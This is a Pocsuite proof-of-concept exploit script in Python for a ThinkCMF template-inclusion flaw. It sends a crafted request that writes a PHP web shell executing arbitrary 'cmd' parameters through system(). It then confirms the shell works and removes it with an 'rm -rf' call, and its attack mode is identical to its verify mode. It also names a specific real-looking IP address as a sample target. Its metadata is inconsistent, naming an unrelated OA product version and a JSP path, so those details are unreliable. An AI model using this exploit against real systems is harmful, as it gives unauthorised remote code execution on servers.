#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urljoin
from pocsuite.api.request import req
import hashlib
import json
import string
import random
class TestPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-10-24'
    createDate = '2019-10-25'
    updateDate = '2019-10-25'
    references = ['']
    name = 'ThinkCMF 任意内容包含漏洞'
    appPowerLink = 'https://www.thinkcmf.com/'
    appName = 'ThinkCMF'
    appVersion = 'E-cology OA V9 V8'
    vulType = '文件包含'
    desc = '''
    远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码
    '''
    samples = ['http://42.243.25.75:8082/mobile/DBconfigReader.jsp']
    install_requires = ['']
    def _verify(self):
        def ThinkCMF_getshell(url):
            verifycode = ''.join(random.sample(string.ascii_letters + string.digits, 8))
            vuln_url = url + R'''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('{}.php','%3c%3fphp%0d%0aecho%20md5%28%22{}%22%29%3b%0d%0a%20%20%20%20if%28isset%28%24_REQUEST%5b%22cmd%22%5d%29%29%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22%3cpre%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%24cmd%20%3d%20%28%24_REQUEST%5b%22cmd%22%5d%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20system%28%24cmd%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20echo%20%22%3c%2fpre%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20die%3b%0d%0a%20%20%20%20%7d%0d%0aphpinfo%28%29%3b%0d%0a%3f%3e')</php>'''.format(verifycode,verifycode)
            r = req.get(vuln_url)
            response_str = json.dumps(r.headers.__dict__['_store'])
            if r.status_code == 200 and 'PHP' in response_str:
                check_shell(url,verifycode)
        def check_shell(url,verifycode):
            shell_url = url + '/{}.php'.format(verifycode)
            r = req.get(shell_url)
            if r.status_code == 200 and hashlib.md5(verifycode).hexdigest() in r.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = urljoin(self.url,"/{}.php".format(verifycode))
                req.get(urljoin(self.url,"/{}.php?cmd=rm -rf {}.php".format(verifycode,verifycode)))
        result = {}
        ThinkCMF_getshell(self.url)
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
